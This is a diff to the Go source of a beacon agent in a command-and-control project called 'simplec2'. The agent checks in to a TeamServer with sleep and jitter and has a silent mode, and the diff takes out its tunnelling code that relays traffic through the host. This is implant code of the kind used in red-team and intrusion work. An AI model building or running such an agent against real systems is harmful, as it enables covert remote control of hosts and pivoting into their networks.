@@ -26,8 +26,6 @@ import (
 
 		"simplec2/pkg/bridge" // Import bridge package
 
-		"sync" // Import sync package
-
 	
 
 		"google.golang.org/protobuf/types/known/timestamppb"
@@ -42,11 +40,6 @@ var (
 	beaconID   string
 	sessionID  string
 	sessionKey []byte
-
-	// Global queue for outgoing tunnel messages from agent to TeamServer
-	outgoingTunnelQueue chan *bridge.TunnelMessage
-	// Mutex to protect access to command.activeTunnels map for dispatching incoming data
-	tunnelDispatchMutex sync.Mutex
 )
 
 // --- Silent Mode Support ---
@@ -71,11 +64,6 @@ func main() {
 	if serverURL == "" {
 		log.Fatal("serverURL is not set. Please set it at build time using -ldflags.")
 	}
-
-	// Initialize outgoing tunnel queue
-	outgoingTunnelQueue = make(chan *bridge.TunnelMessage, 100) // Buffer for 100 messages
-	// Inject outgoingTunnelQueue into command package for sendTunnelData
-	command.SetOutgoingTunnelQueue(outgoingTunnelQueue)
 
 	if err := performHandshake(); err != nil {
 		log.Fatalf("Handshake failed: %v", err)
@@ -114,15 +102,11 @@ func checkInLoop() {
 
 		log.Printf("Checking in for tasks (interval: %s, jitter: %d%%)...", command.SleepInterval, command.JitterPercentage)
 
-		// Collect outgoing tunnel messages
-		outgoingMsgs := collectOutgoingTunnelMessages()
-
 		checkinReq := &bridge.CheckInBeaconRequest{
 			BeaconId:           beaconID,
 			ListenerName:       "http", // TODO: Make configurable or dynamic
 			RemoteAddr:         "127.0.0.1:0", // TODO: Get actual remote address
 			Timestamp:          timestamppb.Now(), // Placeholder
-			OutgoingTunnelData: outgoingMsgs,
 		}
 
 		checkinReqBytes, err := json.Marshal(checkinReq) // Marshal protobuf message to JSON
@@ -154,62 +138,6 @@ func checkInLoop() {
 			processTasks(checkinData.Tasks)
 		} else {
 			log.Println("No tasks received.")
-		}
-
-		// Process incoming tunnel messages
-		if len(checkinData.IncomingTunnelData) > 0 {
-			log.Printf("Received %d incoming tunnel messages.", len(checkinData.IncomingTunnelData))
-			dispatchIncomingTunnelMessages(checkinData.IncomingTunnelData)
-		}
-	}
-}
-
-// collectOutgoingTunnelMessages non-blockingly collects messages from the outgoingTunnelQueue.
-func collectOutgoingTunnelMessages() []*bridge.TunnelMessage {
-	var messages []*bridge.TunnelMessage
-	for {
-		select {
-		case msg := <-outgoingTunnelQueue:
-			messages = append(messages, msg)
-			if len(messages) >= 10 { // Don't send too many messages at once, max 10
-				return messages
-			}
-		default:
-			return messages
-		}
-	}
-}
-
-// dispatchIncomingTunnelMessages dispatches incoming tunnel messages to the appropriate tunnel handler.
-func dispatchIncomingTunnelMessages(messages []*bridge.TunnelMessage) {
-	tunnelDispatchMutex.Lock() // Protect activeTunnels map
-	defer tunnelDispatchMutex.Unlock()
-
-	for _, msg := range messages {
-		entry, exists := command.GetActiveTunnel(msg.TunnelId) // Use getter from command package
-		if !exists {
-			log.Printf("Received tunnel message for non-existent tunnel ID: %s", msg.TunnelId)
-			// Send an error back to TeamServer for this tunnel
-			command.SendTunnelError(msg.TunnelId, "Tunnel not found on agent", false)
-			continue
-		}
-
-		switch msg.CommandType {
-		case bridge.TunnelMessage_DATA:
-			select {
-			case entry.Inbound <- msg.Data:
-				// Data successfully queued
-			case <-time.After(100 * time.Millisecond): // Avoid blocking indefinitely
-				log.Printf("Failed to queue incoming data for tunnel %s: inbound channel full", msg.TunnelId)
-				command.SendTunnelError(msg.TunnelId, "Agent inbound channel full", false)
-			}
-		case bridge.TunnelMessage_STOP, bridge.TunnelMessage_START: // Start commands are handled by tasks, stop signals are for cleanup
-			if msg.IsFin { // If TeamServer explicitly wants to close
-				command.SignalTunnelClose(msg.TunnelId) // Use helper from command package
-			}
-		default:
-			log.Printf("Received unknown tunnel command type: %v for tunnel %s", msg.CommandType, msg.TunnelId)
-			command.SendTunnelError(msg.TunnelId, fmt.Sprintf("Unknown tunnel command type: %v", msg.CommandType), false)
 		}
 	}
 }
